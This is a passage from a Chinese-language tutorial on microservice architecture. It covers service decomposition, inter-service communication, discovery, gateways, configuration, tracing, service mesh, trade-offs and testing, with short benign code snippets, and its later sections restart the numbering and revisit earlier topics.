Martin Fowler 对微服务的定义核心要点：

1. **一组小服务**：每个服务围绕业务能力构建。
2. **独立部署**：每个服务可以独立上线，不影响其他。
3. **去中心化**：每个服务有自己的数据库、技术栈。
4. **轻量通信**：服务间用 HTTP/REST、gRPC、消息队列通信。
5. **按业务能力组织团队**：团队围绕服务而非技术分层。

---

### 二、微服务拆分原则

拆分是微服务最难的一步——拆得太粗等于没拆，拆得太细变成分布式单体。

#### 2.1 按业务能力拆分

**原则**：一个服务对应一个业务能力，高内聚低耦合。

\`\`\`
电商系统按业务能力拆分：
  用户服务（User Service）—— 用户注册、登录、个人信息
  商品服务（Product Service）—— 商品管理、搜索、类目
  订单服务（Order Service）—— 下单、查询、状态流转
  支付服务（Payment Service）—— 支付、退款
  库存服务（Inventory Service）—— 库存扣减、补充
  物流服务（Logistics Service）—— 发货、运单跟踪
\`\`\`

**判断标准**：

- 这个业务能否独立演进？（如"物流"可以独立优化配送算法）
- 这个业务的数据是否独立？（如"用户"数据与"商品"数据无强关联）
- 这个业务的变更频率是否与其他不同？（如"商品"频繁改，"用户"少改）

#### 2.2 领域驱动设计（DDD）指导拆分

**DDD（Domain-Driven Design）** 用"限界上下文（Bounded Context）"界定服务边界：

\`\`\`
电商领域的限界上下文：
  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐
  │  用户上下文   │  │  商品上下文   │  │  订单上下文   │
  │ User/Address │  │ Product/SKU │  │ Order/Item  │
  │  Cart        │  │ Category    │  │  Status     │
  └─────────────┘  └─────────────┘  └─────────────┘
                         ↕ 上下文映射（Context Mapping）
  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐
  │  支付上下文   │  │  库存上下文   │  │  物流上下文   │
  │ Payment/Refund│ │ Stock/Warehouse│ │ Shipment   │
  └─────────────┘  └─────────────┘  └─────────────┘

每个上下文 → 一个微服务，内部有自己的领域模型
上下文之间通过 API/事件交互，不共享数据库
\`\`\`

**DDD 拆分的关键概念**：

- **限界上下文**：一个业务领域的边界，边界内模型一致。
- **聚合（Aggregate）**：一组关联对象，作为一个整体操作（如订单+订单项）。
- **领域事件**：业务事件（如"订单已支付"），跨上下文通信。

#### 2.3 合适的粒度

**粒度太粗**：等于没拆，一个服务包含太多职责。

**粒度太细**：每个 CRUD 都拆成一个服务，变成"分布式单体"——服务间调用链太长，部署协调困难。

**经验法则**：

- 一个服务 2-4 周能重写（团队能掌控）。
- 一个服务对应一个团队（康威定律）。
- 一个服务一个数据库（数据独立）。
- 不要为了拆而拆，先粗后细（演进式拆分）。

**反面案例**：把"用户查询"和"用户修改"拆成两个服务——太细，每次操作都要跨服务调用，增加无谓复杂度。

#### 2.4 数据库拆分

微服务的核心原则之一：**每个服务拥有自己的数据库**，不共享。

\`\`\`
错误（共享数据库）：
  用户服务 ─┐
  订单服务 ─┼──→ 同一个 MySQL（所有表）
  商品服务 ─┘
  → 表结构耦合，一个服务改表影响其他

正确（数据库独立）：
  用户服务 → user-db（用户表）
  订单服务 → order-db（订单表）
  商品服务 → product-db（商品表）
  → 各自独立，通过 API 获取对方数据
\`\`\`

**数据库拆分的方式**：

| 方式 | 说明 | 优缺点 |
|------|------|--------|
| 每服务独立库 | 每个服务一个数据库 | 彻底解耦，但跨服务查询难 |
| 共享库不同表 | 同库不同 schema | 过渡方案，未彻底解耦 |
| 读写分离 | 写主库，读从库 | 读多写少场景 |
| CQRS | 读写模型分离 | 复杂但灵活 |

---

### 三、微服务拆分实战：电商系统

以电商系统为例，展示完整的微服务拆分。

#### 3.1 服务清单与职责

\`\`\`
电商微服务架构：
┌──────────┐     ┌──────────────────────────────────────────┐
│  客户端   │────→│            API 网关 (Gateway)             │
│ Web/App  │     │  路由/鉴权/限流/聚合                      │
└──────────┘     └──────────────────────────────────────────┘
                          ↓ 按路由分发
   ┌──────┬──────┬──────┬──────┬──────┬──────┐
   ↓      ↓      ↓      ↓      ↓      ↓      ↓
 用户   商品   订单   支付   库存   物流   促销
 服务   服务   服务   服务   服务   服务   服务
   │      │      │      │      │      │      │
 user-db prod-db ord-db pay-db inv-db log-db prom-db
\`\`\`

#### 3.2 各服务职责与边界

**用户服务**

- 职责：注册、登录、个人信息、收货地址。
- 数据库：users, addresses。
- API：GET /users/{id}, POST /users/login。
- 边界：不管订单、不管商品。

**商品服务**

- 职责：商品 CRUD、搜索、类目管理。
- 数据库：products, skus, categories。
- API：GET /products/{id}, GET /products/search。
- 边界：不管库存（库存是独立服务）。

**订单服务**

- 职责：下单、订单查询、状态流转（待支付/已支付/已发货/已完成）。
- 数据库：orders, order_items。
- API：POST /orders, GET /orders/{id}。
- 边界：下单时调用商品服务查价格、库存服务扣库存、支付服务发起支付。

**支付服务**

- 职责：发起支付、支付回调处理、退款。
- 数据库：payments, refunds。
- API：POST /payments, POST /payments/callback。
- 边界：不碰订单状态，支付成功后通知订单服务。

**库存服务**

- 职责：库存扣减、回滚、补充。
- 数据库：stocks。
- API：POST /stocks/deduct, POST /stocks/rollback。
- 边界：只管库存数字，不管订单。

**物流服务**

- 职责：生成运单、查询物流。
- 数据库：shipments。
- API：POST /shipments, GET /shipments/{id}。
- 边界：接到"已发货"事件后生成运单。

#### 3.3 服务间调用关系

\`\`\`
下单流程（同步调用 + 异步事件）：
  客户端 → 网关 → 订单服务
    ├→ 同步调用商品服务（查商品价格）
    ├→ 同步调用库存服务（扣库存）
    ├→ 同步调用用户服务（查收货地址）
    ├→ 写入订单（待支付）
    └→ 投递"订单创建"事件到 MQ
         ↓ 异步
    ├→ 积分服务（加积分）
    ├→ 通知服务（发短信）
    └→ 风控服务（风险检测）

支付流程：
  客户端 → 网关 → 支付服务
    ├→ 调用第三方支付网关
    ├→ 支付成功
    └→ 投递"支付成功"事件到 MQ
         ↓ 异步
    ├→ 订单服务（更新状态为已支付）
    └→ 库存服务（确认扣减）
\`\`\`

要点：关键路径同步调用（查价格、扣库存），非关键路径异步事件（积分、通知）。

---

### 四、服务间通信

微服务拆分后，服务间需要通信。三种主流方式各有适用场景。

#### 4.1 同步通信：HTTP/REST

**特点**：请求-响应模式，简单直观，通用性强。

\`\`\`
订单服务 → HTTP GET → 商品服务 /products/123
         ← 200 OK { id:123, name:"手机", price:2999 }
\`\`\`

**多语言对照**：

Java (Spring RestTemplate):
\`\`\`java
Product product = restTemplate.getForObject(
    "http://product-service/products/" + productId, Product.class);
\`\`\`

Python (requests):
\`\`\`python
resp = requests.get(f"http://product-service/products/{product_id}")
product = resp.json()
\`\`\`

Go (http):
\`\`\`go
resp, _ := http.Get("http://product-service/products/" + productID)
body, _ := io.ReadAll(resp.Body)
\`\`\`

Node.js (fetch):
\`\`\`javascript
const resp = await fetch(\`http://product-service/products/\${productId}\`);
const product = await resp.json();
\`\`\`

**优点**：简单、通用、易调试、语言无关。

**缺点**：

- **调用链风险**：A→B→C→D，任一环节慢则整条链慢。
- **同步阻塞**：等待响应期间占用线程/连接。
- **耦合**：调用方依赖被调方的可用性。

#### 4.2 同步通信：gRPC

**特点**：基于 HTTP/2 + Protobuf，高性能二进制协议。

\`\`\`
.proto 定义：
  service ProductService {
    rpc GetProduct(ProductRequest) returns (ProductResponse);
  }
  message ProductRequest { int32 id = 1; }
  message ProductResponse { int32 id = 1; string name = 2; double price = 3; }

生成各语言代码 → 强类型调用
\`\`\`

**优点**：

- 高性能：二进制比 JSON 小 3-10 倍，HTTP/2 多路复用。
- 强类型：Protobuf 定义接口，编译期检查。
- 双向流：支持流式 RPC。

**缺点**：

- 调试不如 HTTP 直观（二进制不可读）。
- 需要生成代码，开发流程重。
- 浏览器支持差（需 gRPC-Web 网关）。

**适用场景**：内部服务间高频调用（性能敏感）。

#### 4.3 异步通信：消息队列

**特点**：生产者投消息到 MQ，消费者异步处理，解耦削峰。

\`\`\`
订单服务 → 投递"order.created"消息 → MQ
                                      ↓
                              积分服务/通知服务/风控服务 异步消费
\`\`\`

**优点**：解耦、削峰、不阻塞调用方。

**缺点**：最终一致（有延迟）、调试复杂、需要幂等。

#### 4.4 三种通信方式对比

| 方式 | 模式 | 耦合 | 性能 | 一致性 | 适用 |
|------|------|------|------|--------|------|
| HTTP/REST | 同步 | 高 | 中 | 强 | 简单调用、对外 API |
| gRPC | 同步 | 中 | 高 | 强 | 内部高频调用 |
| 消息队列 | 异步 | 低 | 高 | 最终 | 事件通知、解耦削峰 |

**生产建议**：关键路径用同步（必须等结果），非关键路径用异步（解耦）。

---

### 五、服务注册与发现

微服务实例动态变化（扩容/缩容/故障），调用方不能写死地址，需要"服务注册与发现"。

#### 5.1 为什么需要服务发现

\`\`\`
没有服务发现：
  订单服务写死商品服务地址：http://10.0.0.5:8080
  → 商品服务扩容到 10.0.0.6，订单服务不知道
  → 商品服务 10.0.0.5 宕机，订单服务还在调用死地址

有服务发现：
  商品服务启动 → 注册到注册中心（"我是 product-service，地址 10.0.0.5:8080"）
  订单服务调用前 → 问注册中心"product-service 在哪？"
  注册中心 → "10.0.0.5:8080, 10.0.0.6:8080"（返回所有实例）
  订单服务 → 任选一个调用

  10.0.0.5 宕机 → 心跳超时 → 注册中心剔除 → 订单服务再问时拿不到它
\`\`\`

#### 5.2 服务发现的工作流程

\`\`\`
1. 服务注册：服务启动时，把自己的地址注册到注册中心
2. 心跳维持：服务定期发心跳，注册中心定期检查健康
3. 服务发现：调用方从注册中心获取服务实例列表
4. 负载均衡：调用方从列表中选一个实例调用
5. 故障剔除：心跳超时的实例被注册中心剔除
6. 通知更新：注册中心通知调用方更新实例列表
\`\`\`

#### 5.3 主流注册中心对比

| 注册中心 | 一致性 | 语言 | 特点 |
|---------|--------|------|------|
| Eureka | AP | Java | Netflix 开源，已停止维护 |
| Nacos | AP/CP | Java | 阿里开源，注册+配置一体 |
| Consul | CP | Go | HashiCorp，多数据中心 |
| Zookeeper | CP | Java | 通用协调，偏重 |
| etcd | CP | Go | K8s 用，通用 KV |

**CP vs AP 选型**：

- **CP（一致+分区容错）**：保证数据一致，但分区时可能不可用（Zookeeper/Consul/etcd）。
- **AP（可用+分区容错）**：保证可用，但可能返回旧数据（Eureka/Nacos AP 模式）。

**服务发现选 AP**：注册中心的核心是"可用"（宁可返回少量旧数据，也不能查询失败）。Eureka/Nacos 的 AP 模式更适合服务发现。

#### 5.4 心跳与健康检查

\`\`\`
服务实例 → 每 30s 发心跳 → 注册中心
  超过 90s 未收到心跳 → 标记为不可用 → 剔除

健康检查类型：
  心跳上报：实例主动上报"我还活着"
  主动探测：注册中心定期 HTTP/TCP 探测实例健康
\`\`\`

**多语言对照（服务注册）**：

Java (Spring Cloud Nacos):
\`\`\`java
@SpringBootApplication
@EnableDiscoveryClient
public class OrderServiceApplication { ... }
// 配置 spring.cloud.nacos.discovery.server-addr=127.0.0.1:8848
\`\`\`

Go (Consul):
\`\`\`go
agent.ServiceRegister{
    Name: "order-service",
    Addr: "10.0.0.5",
    Port: 8080,
    Check: &agent.ServiceCheck{
        HTTP: "http://10.0.0.5:8080/health",
        Interval: "10s",
    },
}
\`\`\`

Python (consul-py):
\`\`\`python
consul.agent.service.register(
    name='order-service',
    address='10.0.0.5',
    port=8080,
    check={'http': 'http://10.0.0.5:8080/health', 'interval': '10s'}
)
\`\`\`

---

### 六、负载均衡

服务发现返回多个实例，调用方需要"选一个"——这就是负载均衡。

#### 6.1 客户端负载均衡 vs 服务端负载均衡

**服务端负载均衡（如 Nginx）**：

\`\`\`
调用方 → Nginx（负载均衡器）→ 分发到多个实例
  调用方不感知实例列表，Nginx 统一转发
\`\`\`

**客户端负载均衡（如 Ribbon/LoadBalancer）**：

\`\`\`
调用方 → 从注册中心获取实例列表 → 自己选一个调用
  调用方直接连实例，无中间层
\`\`\`

微服务中常用**客户端负载均衡**（少一跳网络，性能更高）。

#### 6.2 负载均衡策略

**轮询（Round Robin）**：依次分配，1→2→3→1→2→3...

**随机（Random）**：随机选一个。

**权重（Weighted）**：按权重分配（性能强的实例权重高）。

**最少连接（Least Connections）**：选当前连接数最少的实例。

**一致性哈希（Consistent Hash）**：相同请求路由到同一实例（会话保持）。

**多语言对照（客户端负载均衡）**：

Java (Spring Cloud LoadBalancer):
\`\`\`java
@Bean
@LoadBalanced
RestTemplate restTemplate() { return new RestTemplate(); }
// 调用时用服务名替代 IP
restTemplate.getForObject("http://product-service/products/1", Product.class);
\`\`\`

Go (自定义):
\`\`\`go
type RoundRobin struct {
    instances []string
    idx       int
    mu        sync.Mutex
}
func (r *RoundRobin) Next() string {
    r.mu.Lock()
    defer r.mu.Unlock()
    inst := r.instances[r.idx % len(r.instances)]
    r.idx++
    return inst
}
\`\`\`

#### 6.3 健康检查与重试

负载均衡器需要：

- **健康检查**：定期检查实例健康，不健康的不分配。
- **重试**：调用失败时重试其他实例（避免单点故障）。
- **熔断**：某实例持续失败，暂时不选它。

---

### 七、API 网关

API 网关是微服务的"统一入口"，所有外部请求先到网关，再由网关路由到后端服务。

#### 7.1 网关的职责

\`\`\`
客户端 → API 网关 → 微服务集群
          │
          ├─ 路由转发（/api/orders → 订单服务）
          ├─ 鉴权认证（校验 Token）
          ├─ 限流熔断（保护后端）
          ├─ 日志监控（记录请求）
          ├─ 协议转换（HTTP → gRPC）
          ├─ 请求聚合（一次请求调多个服务）
          └─ 灰度发布（按版本路由）
\`\`\`

#### 7.2 网关的核心能力

**路由转发**：

\`\`\`
/api/users/**   → user-service
/api/products/** → product-service
/api/orders/**   → order-service
\`\`\`

**鉴权**：

\`\`\`
请求带 Token → 网关校验 Token → 有效则转发，无效则 401
  → 后端服务不需要重复校验（网关已过滤）
\`\`\`

**限流**：

\`\`\`
网关层限流 → 超过阈值的请求直接返回 429 → 保护后端服务
\`\`\`

**请求聚合**：

\`\`\`
客户端要"订单详情"（订单+商品+用户信息）
  无聚合：客户端发 3 次请求（订单、商品、用户）
  有聚合：客户端发 1 次到网关 → 网关并行调 3 个服务 → 聚合返回
\`\`\`

#### 7.3 主流网关

| 网关 | 语言 | 特点 |
|------|------|------|
| Spring Cloud Gateway | Java | Spring 生态，过滤器丰富 |
| Zuul | Java | Netflix，已逐步被 Gateway 替代 |
| Kong | Lua/Nginx | 插件丰富，高性能 |
| APISIX | Lua/Nginx | 动态路由，高性能 |
| Nginx + Lua | C/Lua | 经典方案，需自己写逻辑 |
| Traefik | Go | 云原生，自动服务发现 |

---

### 八、配置中心

微服务有几十上百个实例，配置管理是个大问题。配置中心集中管理所有服务的配置，支持动态推送。

#### 8.1 为什么需要配置中心

\`\`\`
没有配置中心：
  100 个服务实例，每个有 config.properties
  改一个配置（如数据库地址）→ 改 100 个文件 → 重启 100 个实例

有配置中心：
  配置中心统一管理 → 改一处 → 推送到所有实例 → 热生效（不重启）
\`\`\`

#### 8.2 配置中心的能力

- **集中存储**：所有服务的配置统一管理。
- **环境隔离**：dev/test/prod 环境配置分离。
- **动态推送**：配置变更实时推送到服务，无需重启。
- **版本管理**：配置变更有历史记录，可回滚。
- **灰度发布**：配置按比例推送。

#### 8.3 主流配置中心

| 配置中心 | 特点 |
|---------|------|
| Nacos | 阿里开源，注册+配置一体，国内主流 |
| Apollo | 携程开源，功能完善，支持灰度 |
| Spring Cloud Config | Spring 官方，基于 Git |
| Consul | HashiCorp，KV 配置 |
| etcd | K8s 用，分布式 KV |

**多语言对照（读取配置）**：

Java (Nacos):
\`\`\`java
@Value("\${order.timeout:30000}")
private int orderTimeout;

@NacosConfigListener(dataId = "order-service.yaml")
public void onConfigChange(String config) {
    // 配置变更时回调，热更新
}
\`\`\`

Go (Viper + Nacos):
\`\`\`go
viper.SetConfigType("yaml")
viper.AddRemoteProvider("nacos", "127.0.0.1:8848", "order-service.yaml")
viper.ReadConfig()
timeout := viper.GetInt("order.timeout")
\`\`\`

---

### 九、链路追踪

微服务一个请求可能经过 5-10 个服务，出问题时排查极其困难。链路追踪解决这个问题。

#### 9.1 为什么需要链路追踪

\`\`\`
用户下单慢，5 秒才返回。问题在哪？
  网关 → 订单 → 商品 → 库存 → 支付 → ...

没有链路追踪：每个团队查自己的日志，互相推诿。
有链路追踪：一条 Trace 串起所有调用，一眼定位"库存服务慢了 4 秒"。
\`\`\`

#### 9.2 Trace-Span 模型

\`\`\`
Trace（一次完整请求）= 多个 Span（一次服务调用）

Trace: order-create (traceId=abc123)
  ├─ Span 1: Gateway (5s)        ← 网关
  │   ├─ Span 2: OrderService (4.8s)  ← 订单服务
  │   │   ├─ Span 3: ProductService (50ms)  ← 商品服务
  │   │   ├─ Span 4: InventoryService (4.5s) ← 库存服务（慢！）
  │   │   └─ Span 5: PaymentService (200ms)  ← 支付服务
\`\`\`

每个 Span 包含：

- traceId：整个请求的 ID。
- spanId：本次调用的 ID。
- parentId：父调用的 ID。
- 操作名、开始/结束时间、标签、日志。

#### 9.3 主流链路追踪系统

| 系统 | 特点 |
|------|------|
| Zipkin | Twitter 开源，轻量 |
| Jaeger | Uber 开源，CNCF 项目 |
| SkyWalking | Apache 项目，国产，无侵入 |
| Pinpoint | Naver 开源，字节码增强 |

**多语言对照（埋点）**：

Java (SkyWalking 自动埋点):
\`\`\`java
// SkyWalking agent 自动埋点，业务代码无侵入
@Trace
public Order createOrder(OrderRequest req) {
    // 自动记录 Span
}
\`\`\`

Go (OpenTelemetry):
\`\`\`go
ctx, span := tracer.Start(ctx, "createOrder")
defer span.End()
span.SetAttributes(attribute.String("orderId", orderID))
\`\`\`

Python (OpenTelemetry):
\`\`\`python
with tracer.start_as_current_span("createOrder") as span:
    span.set_attribute("orderId", order_id)
\`\`\`

---

### 十、服务网格（Service Mesh）

#### 10.1 服务网格的诞生

微服务治理（负载均衡、熔断、重试、链路追踪）原本在业务代码里实现（如 Spring Cloud 的各种组件），导致：

- 业务代码与治理逻辑耦合。
- 多语言难统一（Java 有 Spring Cloud，Go/Python 要自己造轮子）。
- 治理逻辑升级要改业务代码。

**Service Mesh** 把治理逻辑从业务代码剥离到 Sidecar（边车）代理：

\`\`\`
无 Mesh：
  业务代码（含治理逻辑：负载均衡、熔断、重试...）

有 Mesh：
  业务代码（纯业务）←→ Sidecar（治理逻辑）←→ 网络
\`\`\`

#### 10.2 Sidecar 模式

\`\`\`
每个 Pod 里有：
  ┌─────────────────┐
  │  业务容器         │ ← 只管业务
  │  (无治理逻辑)     │
  └────────┬────────┘
           │ localhost
  ┌────────┴────────┐
  │  Sidecar 代理    │ ← 负载均衡/熔断/重试/追踪
  │  (Envoy/Linkerd) │
  └────────┬────────┘
           │
        网络

所有出入流量都经过 Sidecar，业务无感知
\`\`\`

#### 10.3 Istio 架构

Istio 是最流行的 Service Mesh 实现：

\`\`\`
Istio = 数据平面（Envoy Sidecar）+ 控制平面（Istiod）
  数据平面：每个 Pod 一个 Envoy，处理流量
  控制平面：下发路由规则、策略配置
\`\`\`

**Istio 能力**：

- 流量管理：路由、负载均衡、灰度。
- 安全：mTLS 双向认证、授权。
- 可观测：指标、链路追踪、日志。
- 策略：限流、重试、熔断。

#### 10.4 Service Mesh 的价值与代价

**价值**：业务与治理解耦，多语言统一治理，治理能力可热更新。

**代价**：多一跳网络（Sidecar 代理），性能损耗 1-3ms；运维复杂度增加。

---

### 十一、微服务优劣分析

#### 11.1 微服务的优势

**1. 独立部署**

每个服务独立上线，不影响其他。订单服务发版，用户服务不受影响。

**2. 技术多样性**

每个服务选最合适的技术：Java 写订单、Go 写网关、Python 写推荐。

**3. 弹性扩展**

只扩容需要的服务（大促只扩订单和库存），资源利用率高。

**4. 故障隔离**

一个服务的 bug 不会拖垮整个系统（库存挂了，订单还能查，只是不能下单）。

**5. 团队自治**

每个团队负责自己的服务，独立开发部署，减少跨团队协调。

#### 11.2 微服务的劣势

**1. 分布式复杂性**

- 网络不可靠：服务间调用可能超时、失败。
- 数据一致性：跨服务事务难（分布式事务）。
- 调试困难：一个请求跨多个服务，排查难。

**2. 运维成本高**

- 几十个服务的部署、监控、告警。
- 需要容器化（Docker/K8s）、CI/CD、自动化运维。
- 没有成熟 DevOps 团队很难驾驭。

**3. 性能损耗**

- 服务间网络调用比进程内调用慢几个数量级。
- 序列化/反序列化开销。

**4. 一致性挑战**

- 每个服务独立数据库，跨服务查询难。
- 分布式事务复杂（Saga/TCC/消息事务）。

**5. 接口契约管理**

- 服务间接口变更需要协调。
- 版本管理复杂。

#### 11.3 微服务的代价量化

| 维度 | 单体 | 微服务 |
|------|------|--------|
| 部署复杂度 | 低（1 个包） | 高（N 个服务） |
| 运维成本 | 低 | 高（需 K8s+监控） |
| 网络开销 | 无 | 有（RPC 调用） |
| 调试难度 | 低（本地调试） | 高（需全链路追踪） |
| 团队要求 | 低 | 高（需 DevOps） |
| 扩展灵活性 | 低 | 高 |

---

### 十二、什么时候不该用微服务

微服务不是银弹，以下场景**不应该**用：

#### 12.1 初创团队/产品验证期

- 业务模式未定型，需求频繁大改。
- 团队小于 10 人，没有专职运维。
- 微服务的运维成本远大于业务收益。
- **建议**：先单体快速迭代，验证成功后再拆。

#### 12.2 简单业务

- 一个 CRUD 应用，没有复杂业务逻辑。
- 几个页面的管理系统。
- **建议**：单体足够，微服务是过度设计。

#### 12.3 团队能力不足

- 没有 DevOps 团队，无法管理几十个服务的部署。
- 没有微服务经验，容易拆错（拆太细或拆错边界）。
- **建议**：先提升团队能力，再考虑微服务。

#### 12.4 对延迟极度敏感

- 高频交易、实时游戏，毫秒级延迟要求。
- 微服务的网络开销不可接受。
- **建议**：单体或进程内通信。

#### 12.5 "渐进式拆分"原则

**不要一次性拆分**！正确做法：

1. 先单体开发，快速验证业务。
2. 业务稳定后，识别出"变化频繁"或"性能瓶颈"的模块。
3. 逐步把这些模块拆成微服务。
4. 边拆边验证，发现问题及时调整。

**Martin Fowler 的"单体优先"原则**：几乎所有成功的微服务系统，都是从单体演进来的，而不是一开始就微服务。

---

### 十三、微服务实战要点

#### 13.1 服务拆分 Checklist

\`\`\`
[ ] 按业务能力拆分（不是按技术分层）
[ ] 每个服务独立数据库
[ ] 服务边界清晰（DDD 限界上下文）
[ ] 粒度合适（不要太细）
[ ] 接口契约稳定（API 版本管理）
\`\`\`

#### 13.2 服务间通信 Checklist

\`\`\`
[ ] 同步调用设超时（不要无限等）
[ ] 同步调用设重试（幂等前提下）
[ ] 异步消息保证幂等消费
[ ] 关键路径同步，非关键异步
[ ] 服务间调用有熔断保护
\`\`\`

#### 13.3 常见坑

**坑1：分布式单体**

拆了微服务但数据库共享，服务间强耦合，部署要协调——本质还是单体，只是更复杂了。
解决：每个服务独立数据库。

**坑2：拆得太细**

每个 CRUD 一个服务，调用链 10 层深，一个操作要调 10 个服务。
解决：合并细粒度服务，按业务能力拆分。

**坑3：同步调用链过长**

A→B→C→D→E，任一环节慢则全链慢。
解决：关键路径同步，非关键路径异步化（MQ）。

**坑4：忽视数据一致性**

下单扣库存跨服务，没有分布式事务保障，导致超卖。
解决：用本地消息表/TCC/Saga 保证最终一致。

**坑5：没有可观测性**

几十个服务没有监控、日志、追踪，出问题抓瞎。
解决：先建监控（Prometheus+Grafana）、日志（ELK）、追踪（Jaeger），再拆服务。

---

### 十四、生产案例

#### 案例1：Netflix 微服务化

Netflix 是微服务的标杆：

- 2008 年开始从单体迁移到微服务（AWS）。
- 拆成数百个微服务。
- 开源了整个生态：Eureka（注册）、Zuul（网关）、Hystrix（熔断）、Ribbon（负载均衡）。
- 一次视频播放涉及几十个服务协作。

启示：微服务支撑了 Netflix 全球化扩展，但也付出了巨大运维成本。

#### 案例2：阿里双 11 微服务

- 数万个微服务实例支撑双 11。
- 全链路压测、灰度发布、限流降级。
- 自研中间件：Nacos（注册配置）、Sentinel（限流）、Seata（分布式事务）。
- 容器化 + K8s 管理。

启示：超大规模微服务需要全套基础设施支撑。

#### 案例3：中型电商的演进

\`\`\`
阶段1：单体 PHP（3 人团队，快速上线）
阶段2：单体 Java + 读写分离（业务增长，性能瓶颈）
阶段3：拆出搜索服务（Elasticsearch，搜索是瓶颈）
阶段4：拆出订单/支付服务（业务复杂，独立扩展）
阶段5：全面微服务化（团队 50+ 人）
\`\`\`

启示：微服务是演进而非一步到位，按需拆分。

---

### 十五、本章小结

微服务架构核心知识回顾：

1. **演进动因**：单体痛点（代码膨胀/部署耦合/技术单一/扩展受限/故障扩散）驱动微服务化。
2. **拆分原则**：按业务能力/DDD 限界上下文拆分，粒度合适，每服务独立数据库。
3. **服务通信**：同步（HTTP/gRPC）用于关键路径，异步（MQ）用于非关键路径。
4. **注册发现**：服务注册中心管理实例，AP 模式更适合（Eureka/Nacos）。
5. **负载均衡**：客户端负载均衡（Ribbon/LoadBalancer），策略包括轮询/随机/权重/一致性哈希。
6. **API 网关**：统一入口，负责路由/鉴权/限流/聚合/灰度。
7. **配置中心**：集中配置+动态推送（Nacos/Apollo）。
8. **链路追踪**：Trace-Span 模型，串起跨服务调用（Zipkin/Jaeger/SkyWalking）。
9. **服务网格**：Sidecar 解耦业务与治理（Istio），代价是复杂度+性能损耗。
10. **不是银弹**：初创/简单业务/团队能力不足时不要用，"单体优先"再渐进拆分。

## 十一、服务拆分方法论

### 11.1 拆分原则

1. **单一职责**：每个服务只负责一个业务领域
2. **高内聚低耦合**：服务内部功能紧密相关，服务间依赖最少
3. **限界上下文**：基于 DDD 领域驱动设计，每个服务有明确的领域边界
4. **数据独立**：每个服务有独立数据库，不共享
5. **渐进拆分**：从单体开始，遇到瓶颈再拆，不要过早拆分

### 11.2 拆分维度

按业务能力拆分：
- 用户服务：注册、登录、个人信息
- 商品服务：商品 CRUD、库存
- 订单服务：下单、取消、查询
- 支付服务：支付、退款
- 通知服务：短信、邮件、推送

按子域拆分（DDD）：
- 核心域：业务核心竞争力（如电商的订单+支付）
- 支撑域：非核心但必要（如用户管理）
- 通用域：通用功能（如认证、权限）

### 11.3 拆分粒度

过粗：单体变"分布式单体"，失去微服务优势
过细：服务太多，运维成本高，网络开销大

建议：
- 初期 5-10 个服务
- 每个服务 3-5 人维护
- 服务间调用链路不超过 5 层

### 11.4 拆分步骤

1. 梳理业务领域，识别限界上下文
2. 定义服务接口和通信协议
3. 数据库拆分：先共享数据库，再逐步独立
4. 代码拆分：先模块化，再服务化
5. 流量切换：灰度迁移，逐步切流量
6. 监控验证：确认拆分后性能和可用性正常

## 十二、微服务通信模式详解

### 12.1 同步通信

RESTful HTTP：
- 简单通用，跨语言
- 适合 CRUD 操作
- 缺点：同步阻塞，性能一般

gRPC：
- 基于 HTTP/2 + Protobuf
- 高性能，二进制编码，支持流式
- 适合内部服务间高频调用
- 多语言支持好（代码生成）

GraphQL：
- 客户端按需查询字段
- 适合聚合多个服务数据
- 缺点：实现复杂，缓存难

### 12.2 异步通信

消息队列（点对点）：
- 生产者发送消息到队列，消费者消费
- 解耦、削峰、异步

发布订阅：
- 生产者发布事件，多个订阅者各自消费
- 事件驱动架构（EDA）

### 12.3 通信模式选择

| 场景 | 推荐模式 | 原因 |
|------|---------|------|
| 用户请求需立即响应 | REST/gRPC | 同步返回结果 |
| 下单后发通知 | 消息队列 | 异步解耦 |
| 多服务数据同步 | 发布订阅 | 广播事件 |
| 实时数据推送 | WebSocket/gRPC Stream | 双向流 |
| 复杂聚合查询 | GraphQL | 按需查询 |

### 12.4 服务间调用容错

1. **超时**：设置合理超时，避免级联阻塞
2. **重试**：可重试操作（GET）自动重试，注意幂等
3. **熔断**：连续失败到阈值后熔断，快速失败
4. **降级**：返回默认值/缓存/简化逻辑
5. **限流**：限制调用频率，保护下游服务
6. **隔离**：线程池/信号量隔离，防止级联故障

## 十三、微服务数据一致性

### 13.1 数据库独立原则

每个微服务有独立数据库，不共享。好处：
- 服务独立部署和扩展
- 技术栈自由选择（SQL/NoSQL）
- 故障隔离

挑战：跨服务数据一致性

### 13.2 跨服务查询

方案一：API 聚合。前端或 API Gateway 调用多个服务，聚合结果。

方案二：CQRS。写操作走领域服务，读操作走专门的读模型（通过事件同步数据）。

方案三：数据冗余。服务 A 缓存服务 B 需要的数据，通过事件同步更新。

### 13.3 跨服务事务

详见下一章（分布式事务），核心方案：
- 本地消息表：最终一致
- Saga：长事务补偿
- TCC：两阶段补偿
- 事务消息：RocketMQ 半消息

### 13.4 数据同步策略

1. **实时同步**：通过事件/MQ 实时推送变更
2. **准实时同步**：CDC（Change Data Capture）监听 binlog
3. **定时同步**：定时任务全量/增量同步
4. **按需查询**：需要时跨服务查询（性能差，慎用）

## 十四、微服务测试策略

### 14.1 测试金字塔

| 层级 | 范围 | 占比 | 速度 |
|------|------|------|------|
| 单元测试 | 函数/类 | 70% | 极快 |
| 集成测试 | 模块间 | 20% | 快 |
| 契约测试 | 服务间接口 | 7% | 中 |
| 端到端测试 | 完整链路 | 3% | 慢 |

### 14.2 契约测试（Contract Testing）

微服务间接口变更容易导致兼容性问题。契约测试通过定义消费者驱动的契约，确保 Provider 的 API 符合 Consumer 的期望。

工具：
- Pact：Consumer 生成契约文件，Provider 验证
- Spring Cloud Contract：Spring 生态契约测试

流程：
1. Consumer 编写期望（请求→响应）
2. 生成契约文件（JSON）
3. Provider 拉取契约文件，生成测试
4. Provider 运行测试，确保满足契约

### 14.3 微服务测试最佳实践

1. 单元测试 mock 所有外部依赖
2. 集成测试使用 Testcontainers 启动真实中间件
3. 契约测试覆盖所有服务间接口
4. E2E 测试覆盖核心业务流程
5. 性能测试关注 P99 延迟和吞吐
6. 混沌测试注入故障，验证容错能力

### 14.4 多语言测试框架对比

Java：JUnit 5 + Mockito + Testcontainers
Go：testing + testify + gomock
Python：pytest + responses + factory_boy
Node.js：Jest + supertest + nock

## 十五、API 网关深度实践

### 15.1 网关核心功能

1. **路由转发**：根据 URL/Header 将请求转发到后端服务
2. **认证鉴权**：统一校验 Token，拒绝非法请求
3. **限流熔断**：保护后端服务，防止雪崩
4. **协议转换**：HTTP ↔ gRPC、WebSocket 适配
